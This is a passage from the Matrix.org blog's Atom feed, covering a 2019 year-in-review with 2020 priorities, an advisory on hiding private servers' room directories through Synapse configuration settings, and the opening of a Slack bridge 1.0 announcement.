&lt;li&gt;&lt;em&gt;Landing the Riot&#x2F;Android rewrite&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 As you probably know, RiotX is a full rewrite of Riot&#x2F;Android in Kotlin using modern AndroidX and Jetpack idioms - and it entered beta &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;introducing-the-riotx-beta-for-android-b17952e8f771&quot;&gt;back in June&lt;&#x2F;a&gt;.  Since then we’ve been frantically working away on both playing catch-up with the old app… as well as implementing all the new stuff (reactions, edits, new E2E verification, cross-signing etc) which makes no sense to waste time adding in Riot&#x2F;Android, but also pushes out the timeline on RiotX itself.&lt;&#x2F;p&gt;
&lt;p&gt;We’re currently sprinting to try to get RiotX ready for FOSDEM in February - hopefully users will have felt the app starting to really stabilise over the last few months (it even supports breadcrumbs now!)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Considering whether to do a similar overhaul of Riot&#x2F;iOS&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 It’s cheating a bit, but Manu (the lead developer on Riot&#x2F;iOS and delivery manager of Riot&#x2F;Mobile in general) has been hacking on an entirely new client called &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;manuroe&#x2F;messagerie&quot;&gt;Messagerie&lt;&#x2F;a&gt; in his spare time, using SwiftUI.  The idea of throwing away the whole UI layer and replacing it with the latest best practices sounds suspiciously like RiotX - it’ll be interesting to see how RiotX&#x2F;iOS takes shape next year! &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Scaling synapse via sharding the master process&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We ended up bottlenecked on IO rather than CPU in 2019, and as a result we worked on splitting synapse’s database across multiple database instances on a per-table granularity.  However, the master process itself doesn’t shard yet; so we’re now bottlenecked on CPU and need to get on and do this asap to unlock further Synapse scalability for mega-monolithic-deployments like the Matrix.org homeserver. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Bridge UI for discovery of users&#x2F;rooms and bridge status&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 There’s been a bit of movement in the last few weeks on this, but nothing concrete yet. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Bandwidth-efficient transports&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ We finished the 100bps CoAP transport proof-of-concept for Matrix, demoed it at FOSDEM and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;03&#x2F;12&#x2F;breaking-the-100-bps-barrier-with-matrix-meshsim-coap-proxy&quot;&gt;shipped it in March&lt;&#x2F;a&gt;. However, we haven’t progressed it much further; it really needs a corporate sponsor who wants to fund work to finish it off and bake it properly into Matrix. &lt;strong&gt;If you’re interested, please &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@matthew:matrix.org&quot;&gt;get in touch&lt;&#x2F;a&gt;.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Bandwidth-efficient routing&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 We also did a bunch of related work on bandwidth-efficient routing, which sadly hasn’t been released yet.  However, it’s interesting to note that the &lt;a href=&quot;https:&#x2F;&#x2F;dsn.tm.kit.edu&#x2F;english&#x2F;&quot;&gt;Decentralized Systems and Network Services Research Group&lt;&#x2F;a&gt; at Karlsruhe Institute of Technology’s Institute of Telematics has been looking into this space too - c.f. their &lt;a href=&quot;https:&#x2F;&#x2F;publikationen.bibliothek.kit.edu&#x2F;1000100364&quot;&gt;A Glimpse of the Matrix&lt;&#x2F;a&gt; paper, which ponders very similar problems. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Getting Dendrite to production.&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 Dendrite work has been bubbling away in the background thanks to Anoa, Brendan, cnly (our GSoC dendrite contributor) and others.  Inevitably most of our bandwidth has gone into getting Synapse to 1.0 and making sure it’s fit for purpose, but we want and need to keep Dendrite alive for next-generation purposes - and in fact New Vector is hiring new people to work on it in 2020. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Inline widgets (polls etc)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 We have an MSC (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2192&quot;&gt;MSC2192&lt;&#x2F;a&gt;), but not an implementation. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Improving VoIP over Matrix.&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Very little progress here, frustratingly.  Jitsi has been upgraded and conference calls should kick ass these days (let us know if they don’t), but 1:1 needs a lot of love.  Hopefully we’ll get to it in 2020. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Adding more bridges, and improving the current ones.&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Lots of bridging progress in 2020 - all new puppeting Slack support; huge fixes to the IRC bridge (including shifting to Postgres at last); Bifrost (the XMPP bridge) progressed too, and there’s been loads of community bridging work around WhatsApp, Discord and others. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Account portability&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;em&gt;Replacing MXIDs with public keys&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We’ve just started looking at implementing these seriously via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;remove_mxids_from_events&#x2F;proposals&#x2F;1228-removing-mxids-from-events.md&quot;&gt;MSC1228&lt;&#x2F;a&gt; (as of last week) - expect progress in 2020.&lt;&#x2F;p&gt;
&lt;p&gt;So that sums up progress on the medium term menu - as you can see, a bunch actually happened; a bunch made progress; a few didn’t happen at all.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;2019-the-longer-term-priorities&quot;&gt;2019: the longer-term priorities&lt;&#x2F;h4&gt;
&lt;p&gt;Finally, on the longer term radar:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Shared-code cross-platform client SDKs (e.g. sharing a native core library between matrix-{js,ios,android}-sdk)&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;No progress here.  Instead, all three main platforms have continued to write and maintain their own platform-specific SDKs for now.  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;seshat&quot;&gt;Seshat&lt;&#x2F;a&gt; however will be the first piece of native rust code shared across all 3 platforms - let’s see how that goes first... &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Matrix daemons (e.g. running an always-on client as a background process in your OS which apps can connect to via a lightweight CS API)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;Pantalaimon&lt;&#x2F;a&gt; lives!&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Push notifications via Matrix (using a daemon-style architecture)&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;No progress here, unless you count the CoAP low-bandwidth work.  However, Bubu (also Riot&#x2F;Android Fdroid maintainer) has been working on a project called &lt;a href=&quot;https:&#x2F;&#x2F;bubu1.eu&#x2F;openpush&#x2F;&quot;&gt;OpenPush&lt;&#x2F;a&gt; which looks to help in this space (albeit not built on Matrix, but could be used by Matrix).  There are a few other related projects.  If someone wants to build this on top of Matrix + CoAP please get in touch asap! &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Clientside homeservers (i.e. p2p matrix) - e.g. compiling Dendrite to WASM and running it in a service worker.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 Work is actually happening on this currently.  Dendrite has successfully compiled to WASM and runs, and we’ve had it (almost) talking HTTP tunnelled over libp2p as part of P2P Matrix experiments.  In 2020 we’re going to be investing a lot in P2P Matrix - to give users full control of their communication without even having to run a server, and also to simplify onboarding and account portability enormously.  We have a talk about this accepted for FOSDEM 2020 (&lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2020&#x2F;schedule&#x2F;event&#x2F;dip_p2p_matrix&#x2F;&quot;&gt;The Path to P2P Matrix&lt;&#x2F;a&gt;) and we’re actively (frantically) hacking on Dendrite to make it happen - keep an eye out for how things develop!&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Experimenting with MLS for E2E Encryption&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 Now that E2E-by-default has entered the “it works! let’s land it in Riot asap” phase, Uhoreg has had some time to start thinking about the longer term future of encryption in Matrix.  &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;wg&#x2F;mls&#x2F;charter&#x2F;&quot;&gt;MLS (Messaging Layer Security)&lt;&#x2F;a&gt; is the IETF’s initiative to define a standard mechanism for end-to-end-encrypted group chats, which has some major algorithmic improvements over Olm&#x2F;Megolm and the Double Ratchet Algorithm as used by Signal.  The catch is that it doesn’t work at all well with decentralisation - however, we’ve been &lt;a href=&quot;https:&#x2F;&#x2F;mailarchive.ietf.org&#x2F;arch&#x2F;msg&#x2F;mls&#x2F;MnLJkbJ_Mwe8Oz0Ll6delGJLPz4&quot;&gt;working with them&lt;&#x2F;a&gt; to try to ensure MLS can work in a decentralised world.  More recently, uhoreg has had a chance to think a lot more about this and we’re working on a proposal for Decentralised MLS which builds on plain MLS while also giving the semantics needed for Matrix.  It’s all very experimental at this point (and the proof-of-concept implementation is written in &lt;a href=&quot;https:&#x2F;&#x2F;julialang.org&#x2F;&quot;&gt;Julia&lt;&#x2F;a&gt;!) - but looks promising.  We’ll share more asap, and will certainly be investing more time in this in 2020.. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Storing and querying more generic data structures in Matrix (e.g. object trees; scene graphs)&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Sadly no progress here :( &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Alternate use cases for VR, IoT, etc.&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;...and none here either.&lt;&#x2F;p&gt;
&lt;p&gt;So, of all the myriad things on our radar for 2019 (as of Dec 2018), hopefully this gives some idea of where we hit the mark.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;2019-the-unpredictable-bits&quot;&gt;2019: the unpredictable bits&lt;&#x2F;h4&gt;
&lt;p&gt;However, there’s also a tonne of other stuff which happened which wasn’t explicitly on the radar.  On the synapse side, we finished fully migrating from Python 2 to Python 3, and started using asyncio and all the latest Python 3 goodies!  We finally &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;6358&quot;&gt;implemented configurable history retention&lt;&#x2F;a&gt; for servers and rooms! We even implemented &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;6409&quot;&gt;self-destructing messages&lt;&#x2F;a&gt; in Synapse (not that Riot exposes them yet). And there has been loads of optimisation and performance work since 1.0 landed in June.&lt;&#x2F;p&gt;
&lt;p&gt;On the ops side, we overhauled all our ops processes and security after the Matrix.org &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;&quot;&gt;datacenter breach&lt;&#x2F;a&gt; in April, throwing away our legacy infrastructure and rebuilding it properly - and subsequently have been expanding our ops team from one dedicated ops person to four.  We also found ourselves having to do another emergency datacenter migration back in November when the old one was unable to reliably service IO for our database cluster. &lt;&#x2F;p&gt;
&lt;p&gt;We also spent a bunch time after shipping Matrix 1.0 working on tightening up Matrix’s privacy model - particularly around third party identity servers, integration managers, and making sure that folks self-hosting Matrix don’t accidentally depend on use 3rd party services without realising it.  If you missed out on the fun at the time, you can read all about it &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;06&#x2F;30&#x2F;tightening-up-privacy-in-matrix&#x2F;&quot;&gt;here&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;09&#x2F;27&#x2F;privacy-improvements-in-synapse-1-4-and-riot-1-4&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;.  This ended up being way more work than we expected, but we’re very glad to have sorted it out now. &lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, mainstream uptake of Matrix has properly taken off, with the French Government launching Tchap (their fork of Riot), now with hundreds of thousands of daily active users.  The &lt;a href=&quot;https:&#x2F;&#x2F;www.heise.de&#x2F;newsticker&#x2F;meldung&#x2F;Open-Source-Bundeswehr-baut-eigene-verschluesselte-Messenger-App-4623404.html&quot;&gt;German Government revealed today&lt;&#x2F;a&gt; that they are also formally trialling Matrix, starting with the Bundeswehr (Ministry of Defense); we’ve been helping them out with the deployment too. It is not an exaggeration to suggest that we could end up with an official cross-government Matrix network, publicly federated with the wider Internet, for self-hosted encrypted decentralised instant messaging.  In fact Ulrich Kelber, the Bundesdatenschutzbeauftragte (Federal Data Protection Commissioner) for Germany &lt;a href=&quot;https:&#x2F;&#x2F;www.golem.de&#x2F;news&#x2F;whatsapp-matrix-oder-xmpp-bmi-sucht-einen-messenger-fuer-bundesbehoerden-1912-145326.html&quot;&gt;pointed out&lt;&#x2F;a&gt;: “You could even set up a privacy-friendly messenger service in cooperation with France, which in the medium term could represent a real alternative to existing products on the market as a pan-European solution”. &lt;&#x2F;p&gt;
&lt;p&gt;Alongside all this, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;12&#x2F;19&#x2F;welcoming-mozilla-to-matrix&#x2F;&quot;&gt;Mozilla announced&lt;&#x2F;a&gt; they are replacing the Moznet IRC network with Matrix; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;20&#x2F;welcome-to-matrix-kde&#x2F;&quot;&gt;KDE joined Matrix&lt;&#x2F;a&gt; in Feb, &lt;a href=&quot;https:&#x2F;&#x2F;phabricator.wikimedia.org&#x2F;T230531&quot;&gt;Wikimedia&lt;&#x2F;a&gt; is getting set up on their server, and more and more massive players (including the largest in the world) keep getting in touch to find out how they can best get onboard Matrix - it’s incredibly exciting.  It also means that we were able to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;10&#x2F;10&#x2F;new-vector-raises-8-5-m-to-accelerate-matrix-riot-modular&#x2F;&quot;&gt;raise capital&lt;&#x2F;a&gt; to keep folks employed to work on Matrix fulltime via &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt; and scale up &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; as a paid hosting platform - which massively helps support core Matrix development.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;2020&quot;&gt;2020&lt;&#x2F;h4&gt;
&lt;p&gt;All that remains now is to make some predictions for 2020.  Our main priorities are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Get E2E enabled for private rooms by default (see above). &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Riot First-time User Experience (FTUE).  While we redesigned Riot’s UI in 2019, there are still far too many weird gotchas which trip over new users.  Starting in October we began a shift to completely change how Riot development works - transitioning the project to being led by the UX design team rather than the dev team, and ensuring that the design team considers the app holistically across all 3 platforms.  Above all else, our priority is to make it kick ass for normal non-technical mainstream users - not just for opensourcey wizards.  This is a tough ask, but we believe it’s literally make-or-break for the project in the long term if Matrix is ever to become as prevalent as Slack or WhatsApp, and we are throwing everything we have at it.  The second that E2E is on by default, the entirety of the Riot teams will be focusing on the mission to clear our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues?q=is%3Aopen+is%3Aissue+label%3Aproject%3Aftue&quot;&gt;FTUE backlog&lt;&#x2F;a&gt;. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;RiotX. We’re shipping RiotX on Android as fast as we can - currently users on Riot&#x2F;Android are left high and dry and we need to do everything we can to finish RiotX and get them upgraded as rapidly as possible. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Communities.  Off the back of FTUE comes the importance of grouping rooms &amp;amp; users together into communities in a much better way than we have today.  This will be up next. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Synapse: shard the master by user&#x2F;room to avoid being it being bottlenecked on CPU.  We also need to apply smarter queue management on federation traffic to better reduce the memory footprint (and so eliminate complexity limits on small-footprint hosted servers!) - and we also desperately need to speed up joins. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Dendrite &amp;amp; P2P Matrix: the plan currently is to use Dendrite as the basis for our P2P Matrix experiments.  In practice this means making it federate using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;remove_mxids_from_events&#x2F;proposals&#x2F;1228-removing-mxids-from-events.md&quot;&gt;MSC1228&lt;&#x2F;a&gt;-semantics (no point in wasting time implementing the ‘legacy’ key management), and then experiment with hooking it up to various P2P transports (e.g. our low-bandwidth CoAP transport) and discovery systems (e.g. mDNS; libp2p; etc).  How we go about actually getting it into production depends entirely on how well the experiment goes; we could evolve Matrix to be hybrid CS&#x2F;P2P; we could treat it as a new protocol and bridge to it; who knows.  Watch this space...&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;MLS: figure out our plan for next-generation E2E - for better scaling, and better reliability, and what (if anything) we should do with &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;wg&#x2F;mls&#x2F;charter&#x2F;&quot;&gt;MLS&lt;&#x2F;a&gt;. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Bridges: loads of work on the horizon to put a better UX on Bridging.  Bridge stability has improved enormously over the last year (thanks Half-Shot!) but we need to transition from being robust but ugly to being robust and polished... &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Spec: we need to work out how to go faster on reviewing MSCs (both our own and from the wider community).  While the governance process in general feels healthier than it’s ever been, empirically we’re not exactly burning through the MSC backlog - and this is in part that MSC work is squeezed in alongside the other dayjob stuff everyone’s working on. Finding the right balance between sculpting spec and sculpting code is tough, but we’re going to try to improve it in 2020. &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Abuse &#x2F; Reputation: we want to empower users to make their own minds up about what content they want to see and not see on Matrix (or what they want to host or not host on their servers &#x2F; communities &#x2F; rooms).  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;mjolnir&quot;&gt;Mjolnir&lt;&#x2F;a&gt; is a good start, but we’ll be continuing to work on this throughout the year.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Meanwhile, all the things listed above that we didn’t get to in 2019 are of course still options on the menu too.&lt;&#x2F;p&gt;
&lt;p&gt;So there you have it.  I’ve not even tried to talk about the amazing stuff that the wider Matrix community has been up to - whether that’s amazing new clients like &lt;a href=&quot;https:&#x2F;&#x2F;dittochat.org&#x2F;&quot;&gt;Ditto&lt;&#x2F;a&gt; (React Native!) or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kiliankoe&#x2F;nio&quot;&gt;Nio!&lt;&#x2F;a&gt; (SwiftUI), or new bridges like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tulir&#x2F;mautrix-facebook&quot;&gt;mautrix-facebook&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tulir&#x2F;mautrix-hangouts&quot;&gt;mautrix-hangouts&lt;&#x2F;a&gt;, or even poljar’s secret rewrite of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;poljar&#x2F;weechat-matrix-rs&quot;&gt;weechat-matrix in Rust&lt;&#x2F;a&gt;; your best bet there is to skim through &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&#x2F;&quot;&gt;TWIM&lt;&#x2F;a&gt;.  Huge undying thanks go out though to everyone who builds on Matrix and keeps the ecosystem maturing and growing (especially while we’re scurrying around shoring up the foundations) - there’s simply no point in Matrix as a protocol without the vibrant community building on top.&lt;&#x2F;p&gt;
&lt;p&gt;All told, it’s been a bit of an epic year (both in terms of wins and fails), and all that remains is to thank &lt;em&gt;everyone&lt;&#x2F;em&gt; who continues to use Matrix (particularly our &lt;a href=&quot;https:&#x2F;&#x2F;www.patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; supporters) for their ongoing support and for helping the project accelerate forwards.  More than ever before, the world needs free and open communication open to all; the age of proprietary communication silos may be coming to an end - consigned to live alongside AOL CDs and Compuserve IDs in the history books.  With your support, Matrix can provide a decent mainstream yet decentralised alternative - and we’ll do everything we can to make that happen in 2020.&lt;&#x2F;p&gt;
&lt;p&gt;Happy holidays!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole Matrix.org team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Avoiding unwelcome visitors on private Matrix servers</title>
        <published>2019-11-09T00:00:00+00:00</published>
        <updated>2019-11-09T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/" type="text/html"/>
        <id>https://matrix.org/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the course of today we&#x27;ve been made aware of folks port-scanning the
general internet to discover private Matrix servers, looking for publicly
visible room directories, and then trying to join rooms listed in them.&lt;&#x2F;p&gt;
&lt;p&gt;If you are running a Matrix server that is intended to be private, you must correctly
configure your server to not expose its public room list to the general public -
and also ensure that any sensitive rooms are invite-only (especially if the
server is federated with the public Matrix network).&lt;&#x2F;p&gt;
&lt;p&gt;In Synapse, this means ensuring that the following options are set correctly in
your &lt;code&gt;homeserver.yaml&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, requires authentication to access the server&amp;#39;s public rooms
&lt;&#x2F;span&gt;&lt;span&gt;# directory through the client API. Defaults to &amp;#39;true&amp;#39;.
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_without_auth: false
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, forbids any other homeserver to fetch the server&amp;#39;s public
&lt;&#x2F;span&gt;&lt;span&gt;# rooms directory via federation. Defaults to &amp;#39;true&amp;#39;.
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_over_federation: false
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;For private servers, you will almost certainly want to explicitly set these to
&lt;code&gt;false&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;, meaning that the server&#x27;s &amp;quot;public&amp;quot; room directory is hidden from the
general internet and wider Matrix network.&lt;&#x2F;p&gt;
&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix clients
on the general internet by viewing a URL like
https:&#x2F;&#x2F;sandbox.modular.im&#x2F;_matrix&#x2F;client&#x2F;r0&#x2F;publicRooms (but for your server). 
If it gives a &amp;quot;Missing access token&amp;quot; error, you are okay.&lt;&#x2F;p&gt;
&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix servers
on the general internet by loading Riot (or similar) on another server, and
entering the target server&#x27;s domain name into the room directory&#x27;s server
selection box.  If you can&#x27;t see any rooms, then are okay.&lt;&#x2F;p&gt;
&lt;p&gt;Relatedly, &lt;strong&gt;please ensure that any sensitive rooms are set to be &amp;quot;invite only&amp;quot;
and room history is not world visible&lt;&#x2F;strong&gt; - particularly if your server is
federated, or if it has public registration enabled.  This stops random
members of the public peeking into them (let alone joining them).&lt;&#x2F;p&gt;
&lt;p&gt;Relying on security-by-obscurity is a very bad idea: all it takes is for someone
to scan the whole internet for Matrix servers, and then trying to join (say)
#finance on each discovered domain (either by signing up on that
server or by trying to join over federation) to cause problems.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, if you don&#x27;t want the general public reading your room directory,
please also remember to turn off public registration on your homeserver.
Otherwise even with the changes above, if randoms can sign up on your server
to view &amp;amp; join rooms then all bets are off.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll be rethinking the security model of room directories in future (e.g.
whether to default them to being only visible to registered users on the local
server, or whether to replace per-server directories with per-community
directories with finer grained access control, etc) - but until this is sorted,
please heed this advice.&lt;&#x2F;p&gt;
&lt;p&gt;If you have concerns about randoms having managed to discover or join rooms
which should have been private, please contact security@matrix.org.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>matrix-appservice-slack bridge 1.0 is here!</title>
        <published>2019-10-03T00:00:00+00:00</published>
        <updated>2019-10-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/10/03/matrix-appservice-slack-bridge-1-0-is-here/" type="text/html"/>
        <id>https://matrix.org/blog/2019/10/03/matrix-appservice-slack-bridge-1-0-is-here/</id>
        
        <content type="html">&lt;p&gt;Hello Matrix enthusiasts! Yesterday we released &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-slack&#x2F;releases&#x2F;tag&#x2F;1.0.0&quot;&gt;matrix-appservice-slack 1.0&lt;&#x2F;a&gt;. This marks a major milestone
in bridge development for the Matrix.org team, being our first bridge to ever reach 1.0. The decision to
release this version came after we decided that the bridge had gained enough features and reached a point
of stability where it could be deployed in the wild with minimal risk.&lt;&#x2F;p&gt;
&lt;p&gt;For those not in the know, the Slack bridge is Node.JS based, and bridges slack channels &amp;amp; users into Matrix
seamlessly. And for those wondering, yes it works with Mattermost too (since their API is compatible with Slack)!
In previous versions only a limited subset of features were supported, making heavy usage of Slack’s
webhook API. As of 1.0, the bridge now makes use of the newer Slack Events&#x2F;RTM API which gives us all we need for
a richer bridging experience. Everything from edits and reactions to typing notifications is supported in the 1.0 release.&lt;&#x2F;p&gt;
&lt;p&gt;Finally for those who are self hosting, we are pleased to offer the ability to &amp;quot;puppet&amp;quot; your Slack account using the
bridge. Puppeting is the process in which the bridge will send messages as if you were sending them from the Slack client
directly, when you talk using your Matrix account. This opens the door to seamless bridging and direct messaging support.&lt;&#x2F;p&gt;
&lt;p&gt;For those wishing to bridge their whole workspace across, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SolarDrew&#x2F;skill-picard&quot;&gt;picard&lt;&#x2F;a&gt; exists
as a tool to manage large scale Slack bridge deployments. This tool is provided by &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@Cadair:matrix.org&quot;&gt;Cadair&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@SolarDrew:matrix.org&quot;&gt;SolarDrew&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2019-10-03-slack1.0-threading.png&quot; alt=&quot;Slack Screenshot&quot; &#x2F;&gt;
